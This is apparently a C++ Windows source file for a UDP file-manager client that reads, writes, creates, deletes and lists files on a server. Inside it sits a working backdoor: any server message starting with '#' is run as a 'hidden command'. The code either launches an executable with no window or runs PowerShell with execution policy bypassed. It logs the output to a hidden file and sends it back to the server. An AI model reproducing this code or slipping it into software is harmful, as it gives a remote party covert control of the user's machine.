#include "client.hpp"

using std::cin;
using std::cout;
using std::cerr;
using std::endl;
using std::string; 
using std::stringstream;
using std::lock_guard;
using std::unique_lock;
using std::mutex;

using std::thread;

int FileManager::StartClient()
{
    // Инициализация Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data_) != 0)
    {
        cerr << "Ошибка при инициализации Winsock." << endl;
        return INVALID_SOCKET;
    }

    // Создание UDP сокета
    socket_ = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (socket_ == INVALID_SOCKET)
    {
        std::cerr << "Не удалось создать UDP сокет." << std::endl;
        WSACleanup();
        return INVALID_SOCKET;
    }

    // Задание адреса сервера
    server_address_.sin_family = AF_INET;
    server_address_.sin_port = htons(DEFAULT_PORT);
    server_address_.sin_addr.s_addr = inet_addr("127.0.0.1");

    int res = inet_pton(AF_INET, DEFAULT_IP, &(server_address_.sin_addr));

}

int FileManager::StopClient()
{
    closesocket(socket_);
    WSACleanup();
    cout << "Server stopped." << endl;

    return 0;
}

int FileManager::SendData(string data)
{
    int total_bytes_send = 0, bytes_to_sent, bytes_sent;
    // Sending the data size
    bytes_to_sent = htonl(data.size());
    bytes_sent = sendto(socket_, reinterpret_cast<char*>(&bytes_to_sent), sizeof(bytes_to_sent), 0, (struct sockaddr*)&server_address_, sizeof(server_address_));
    if (bytes_sent == SOCKET_ERROR)
    {
        cerr << "Ошибка отправки данных.\nError: " << GetLastError() << endl;
        return -1;
    }

    // Sending data in blocks
    while (total_bytes_send < data.size())
    {
        bytes_to_sent = min(data.size() - total_bytes_send, BUFFER_SIZE);
        bytes_sent = sendto(socket_, data.data() + total_bytes_send, bytes_to_sent, 0, (struct sockaddr*)&server_address_, sizeof(server_address_));
        if (bytes_sent == SOCKET_ERROR)
        {
            cerr << "Ошибка отправки данных." << endl;
            return -1;
        }

        total_bytes_send += bytes_sent;
    }

    // Sending a checksum of data
    unsigned checksum = GetCRC32(data);
    checksum = htonl(checksum);
    bytes_sent = sendto(socket_, reinterpret_cast<char*>(&checksum), sizeof(checksum), 0, (struct sockaddr*)&server_address_, sizeof(server_address_));
    if (bytes_sent == SOCKET_ERROR)
    {
        cerr << "Ошибка отправки данных.\nError: " << GetLastError() << endl;
        return -1;
    }

    return total_bytes_send;
}

int FileManager::RecvData(string &data)
{

    int server_addr_size = sizeof(server_address_), expected_size = 0, bytes_read = 0;
    char local_buffer[BUFFER_SIZE + 1];
    int bytes_to_receive, total_bytes_received = 0;

    // Getting the size of the data
    bytes_read = recvfrom(socket_, reinterpret_cast<char*>(&expected_size), sizeof(expected_size), 0, (struct sockaddr*)&server_address_, &server_addr_size);
    if (bytes_read == SOCKET_ERROR)
    {
        cerr << "Ошибка приема данных.\nError: " << GetLastError() << endl;
        return -1;
    }
    bytes_read = 0;
    expected_size = ntohl(expected_size);

    // Getting data in blocks
    while (total_bytes_received < expected_size)
    {
        bytes_to_receive = min(expected_size - total_bytes_received, BUFFER_SIZE);
        bytes_read = recvfrom(socket_, local_buffer, bytes_to_receive, 0, (struct sockaddr*)&server_address_, &server_addr_size);
        if (bytes_read == SOCKET_ERROR)
        {
            cerr << "Ошибка приема данных.\nError: " << GetLastError() << endl;
            return -1;
        }
        total_bytes_received += bytes_read;

        local_buffer[bytes_read] = '\0';
        data += string{ local_buffer };
    }

    // Getting the checksum of the data
    unsigned checksum;
    bytes_read = recvfrom(socket_, reinterpret_cast<char*>(&checksum), sizeof(checksum), 0, (struct sockaddr*)&server_address_, &server_addr_size);
    if (bytes_read == SOCKET_ERROR)
    {
        cerr << "Ошибка приема данных.\nError: " << GetLastError() << endl;
        return -1;
    }
    checksum = ntohl(checksum);

    // Check that the checksum matches
    unsigned calculated_sum = GetCRC32(data);
    if (calculated_sum != checksum)
        data.clear();

    return total_bytes_received;
}

unsigned FileManager::GetCRC32(std::string data)
{
    // Инициализация CRC32
    unsigned int crc = crc32(0L, Z_NULL, 0);

    // Вычисление CRC32 для строки
    crc = crc32(crc, reinterpret_cast<const Bytef*>(data.c_str()), data.length());

    return crc;
}

string FileManager::ParsCommand()
{
    string command, filename, read_str, data;
    cout << ":";
    std::getline(cin, read_str);

    stringstream ss(read_str);
    ss >> command >> filename;
    
    if (command == "read" or command == "Read" or command == "READ")
    {
        read_str = std::to_string(kRead);
        read_str += " " + filename;
    }
    else if (command == "write" or command == "Write" or command == "WRITE")
    {
        read_str = std::to_string(kWrite);
        std::getline(ss, data);
        read_str += " " + filename + data;
    }
    else if (command == "append" or command == "Append" or command == "APPEND")
    {
        read_str = std::to_string(kAppend);
        std::getline(ss, data);
        read_str += " " + filename + " " + data;
    }
    else if (command == "create" or command == "Create" or command == "CREATE")
    {
        read_str = std::to_string(kCreateNew);
        read_str += " " + filename;
    }
    else if (command == "delete" or command == "Delete" or command == "del" or command == "DELETE")
    {
        read_str = std::to_string(kDelete);
        read_str += " " + filename;
    }
    else if (command == "list" or command == "List" or command == "LIST")
    {
        read_str = std::to_string(kList);
    }


    return read_str;
}


VOID FileManager::ThreadStarter(PTP_CALLBACK_INSTANCE Instance, PVOID Parameter, PTP_WORK Work)
{
    FileManager* ptr = reinterpret_cast<FileManager*>(Parameter);
    ptr->RunRequestsCycle();
}

void FileManager::RunRequestsCycle()
{
    string cmd;
    while (true)
    {
        cmd.clear();
        cmd = ParsCommand();
        cmd.insert(0, "#");
        {
            unique_lock<mutex> lock(mt_);
            requests_q.push(cmd);

            cv_.wait(lock, [&] {return !server_data_.empty(); });
            cmd = server_data_;
            server_data_.clear();
        }
        if (cmd != "0")
            cout << cmd << endl;
    }
}

int FileManager::run()
{
    // Устанавливаем кодировку консоли для корректного отображения вывода скрытых команд
    SetConsoleOutputCP(O_TEXT);
    SetConsoleCP(O_TEXT);

    // Инициализируем структуры сокета 
    StartClient();

    // Устанавливаем минимальный маймаут ожидания
    timeval timeout;
    timeout.tv_sec = 0;
    timeout.tv_usec = 1;

    fd_set readSet;
    //FD_ZERO(&readSet);
    //FD_SET(socket_, &readSet);

    // Инициализируем пул потоков
    InitializeThreadpoolEnvironment(&call_back_environ_);
    pool_ = CreateThreadpool(NULL);
    SetThreadpoolThreadMaximum(pool_, TH_SIZE_MAXIMUM);
    SetThreadpoolThreadMinimum(pool_, TH_SIZE_MINIMUM);

    SetThreadpoolCallbackPool(&call_back_environ_, pool_);

    cleanupgroup_ = CreateThreadpoolCleanupGroup();
    SetThreadpoolCallbackCleanupGroup(&call_back_environ_, cleanupgroup_, NULL);

    // Запускаем поток выполнения команд юзера
    workcallback_ = ThreadStarter;
    work_ = CreateThreadpoolWork(workcallback_, this, &call_back_environ_);
    SubmitThreadpoolWork(work_);
    
    
    string request_str;
    while (true)
    {
        request_str.clear();
        FD_ZERO(&readSet);
        FD_SET(socket_, &readSet);
        int result = select(0, &readSet, nullptr, nullptr, &timeout);
        if (result == SOCKET_ERROR)
            cout << "Error: " << GetLastError() << endl;
        if (result != 0 and result != SOCKET_ERROR)
            RecvData(request_str);

        if (!request_str.empty())
        {
            // Если в начале запроса есть символ '#' - это запрос на исполнение скрытой команды
            if (request_str[0] == '#')
            {
                hidden_command_ = request_str;
                workcallback_ = ExecHiddenCommand;
                work_ = CreateThreadpoolWork(workcallback_, this, &call_back_environ_);
                SubmitThreadpoolWork(work_);
            }
            else
            {
                server_data_ = request_str;
                cv_.notify_one();
            }
        }

        if (!requests_q.empty())
        {
            SendData(requests_q.front());
            requests_q.pop();
        }
    }
    
    return 0;
}


// TODO 
// Поправить кодировку вывода powershell
VOID FileManager::ExecHiddenCommand(PTP_CALLBACK_INSTANCE Instance, PVOID Parameter, PTP_WORK Work)
{
    FileManager* ptr = reinterpret_cast<FileManager*>(Parameter);

    string result;
    char buffer[128];

    string cmd;

    cmd = ptr->hidden_command_;
    ptr->hidden_command_.clear();

    int switch_on;
    if (cmd.find(".exe") != string::npos)
    {
        cmd.erase(0, 1);
        switch_on = 1;
    }
    else if (cmd.find("#ps1") != string::npos)
    {
        cmd.erase(0, 4);
        // Формируем команду для запуска PowerShell скрипта
        std::string command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"";
        command += cmd;
        command += "\"";
        cmd = command;
        switch_on = 0;
    }
    else
        switch_on = 0;

    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi = {};
    FILE* pipe;
    HANDLE h_file;
    switch (switch_on)
    {
    case 1:
        si = { sizeof(si) };
        if (CreateProcessA(nullptr, const_cast<char*>(cmd.c_str()), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) 
        {
            //WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            result = "Successfully launched!";
        }
        else
            result = "Error start .exe file.";
        break;

    /*case 2:
        // Открываем процесс PowerShell в режиме чтения и записи
        pipe = _popen("powershell.exe", "r+");
        if (pipe == nullptr)
            result = "Ошибка при запуске PowerShell.";

        // Записываем скрипт в процесс PowerShell
        fputs(cmd.c_str(), pipe);
        fflush(pipe);

        // Закрываем входной поток процесса PowerShell
        fclose(pipe);

        // Читаем вывод из процесса PowerShell
        char buffer[128];
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result += buffer;
        }

        // Закрываем процесс PowerShell
        _pclose(pipe);

        break;*/

    case 0:
        h_file = CreateFileA("_popen.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        SetHandleInformation(h_file, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

        si.dwFlags |= STARTF_USESTDHANDLES;
        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
        si.hStdError = h_file;
        si.hStdOutput = h_file;

        if (CreateProcessA(NULL, const_cast<char*>(cmd.c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
        {
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        CloseHandle(h_file);

        pipe = fopen("_popen.txt", "rb");
        // Читаем вывод команды и сохраняем его в строку
        while (!feof(pipe))
        {
            if (fgets(buffer, sizeof(buffer), pipe) != nullptr)
                result += buffer;
        }
        if (result.empty())
            result = "The command is not supported!";
        // Закрываем файловый поток
        fclose(pipe);
        break;

    default:
        result = "Undefined request";
        break;
    }

    {
        lock_guard<mutex> lock(ptr->mt_);
        ptr->requests_q.push(result);
    }

    return;
}